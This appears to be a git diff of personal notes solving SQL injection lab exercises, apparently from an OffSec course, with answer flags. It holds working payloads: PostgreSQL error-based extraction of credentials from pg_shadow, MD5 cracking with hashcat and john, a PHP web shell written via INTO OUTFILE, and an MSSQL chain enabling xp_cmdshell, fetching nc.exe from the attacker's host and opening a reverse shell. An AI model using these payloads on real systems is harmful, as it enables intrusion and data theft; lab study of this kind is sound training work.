@@ -260,20 +260,39 @@ UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null, null INTO 
 
 Considering the db is PostgresSQL, consulted [PayloadsAllTheThings PostgresSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) section for payloads.
 - Eventually figured this out to return the password
-- Need to cast the passwd to convert to type int
+- Need to cast the passwd to convert to type int (doesn't need '+'.  Space should work fine)
 ![](10.3.2.6ex_pw.png)
 - Grab user name
 ```sql
 union select null, null, cast(user as int), null, null, null from pg_shadow-- //
 	-- rubben
 ```
-
-- Crack password (avrillavigne)
-- Login
-```bash
-p
+- Grab database
+```sql
+union select null, null, cast(SELECT current_database() as int), null, null, null-- //
+	-- glovedb
 ```
 
+- Crack password (avrillavigne)
+```bash
+# hashcat
+echo ae8c67affdb169a42c9631c02fc67ede > pw
+hashcat -m 0 -w 1 pw
+
+# john
+echo rubben:ae8c67affdb169a42c9631c02fc67ede > pw
+john --format=raw-md5 pw
+```
+- If having issues cracking, can try passing the hash directly as the pw
+
+- Login
+```bash
+psql -h 192.168.226.49 -p 5432 -U rubben -d glovedb
+	# it'll ask for password
+```
+
+- Use Pentestmonkey's [**cmd_exec**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution) for flag (NOTE: flag will be different from original answer as I manually did it on a fresh VM)
+![](10.3.2.6_flag.png)
 
 
 > Answer:  OS{7076206eced8864d3637266b1da6d96c}
@@ -282,4 +301,62 @@ p
 
 7. **Capstone Exercise**: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.
 
-> Answer:  .
+- Enumerate & browse
+```bash
+nmap -Pn 192.168.226.50
+	PORT    STATE SERVICE
+	80/tcp  open  http
+	135/tcp open  msrpc
+	139/tcp open  netbios-ssn
+	445/tcp open  microsoft-ds
+
+ferroxbuster -u http://192.168.226.50 -s 200
+	200      GET      194l      500w     8586c http://192.168.226.50/about.aspx
+	200      GET      198l      531w     8918c http://192.168.226.50/doctors.aspx
+	200      GET      202l      522w     9030c http://192.168.226.50/protect.aspx
+	200      GET      231l      791w    11767c http://192.168.226.50/news.aspx
+	200      GET       93l      256w     4140c http://192.168.226.50/login.aspx    <-- Note
+
+# Wappalyzer - ASP.NET 4.0.30319 on Windows Server ISS 10.0
+```
+
+- Navigate to **login.aspx** and enter form fields (all other sites are moot)
+- Send to Burp Repeater & test for columns & vuln parameter
+	![](10.3.2.7ex_orderBy.png)
+		- UsernameTextBox is vuln w/ 2 columns
+
+```sql
+-- Test for vuln param
+'; WAITFOR delay '0:0:10';-- 
+
+'-- Find out dbs version to find possible vulns
+-- Not working, not sure how to find possible vuln avenues - '; IF(CHARINDEX('15.0.',@@VERSION)>0) WAITFOR DELAY '0:0:15'--
+
+'-- Copy Window's nc.exe to folder and create web server
+cp /usr/share/windows-resources/binaries/nc.exe ~/exercises/web 
+python -m http.server 80
+
+''-- Configure xp_cmdshell to work
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+
+-- Download nc.exe to target maching & run
+';EXEC xp_cmdshell "certutil -urlcache -f http://<kali_ip>/nc.exe c:/windows/temp/nc.exe";-- '
+';EXEC xp_cmdshell "c:/windows/temp/nc.exe <kali_ip> 4444 -e cmd.exe";--
+```
+
+```sql
+-- Encoded
+%27%3B%20WAITFOR%20delay%20%270%3A0%3A10%27%3B%20EXEC%20sp_configure%20%22show%20advanced%20options%22%2C1%3B%20RECONFIGURE%3B%20EXEC%20sp_configure%20%22xp_cmdshell%22%2C1%3B%20RECONFIGURE%3B%20EXEC%20xp_cmdshell%20%22certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.211%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe%22%3B%20EXEC%20xp_cmdshell%20%22c%3A%2Fwindows%2Ftemp%2Fnc.exe%20-c%20192.168.45.211%20-p%204444%20-e%20cmd.exe%22%3B--%20%2F%2F
+```
+
+- In nc listener
+```powershell
+cd C:\
+dir /s flag.txt
+type C:\inetpub\wwwroot\flag.txt
+```
+
+> Answer:  OS{67ca0eacbdb181c024335575a90602c1}
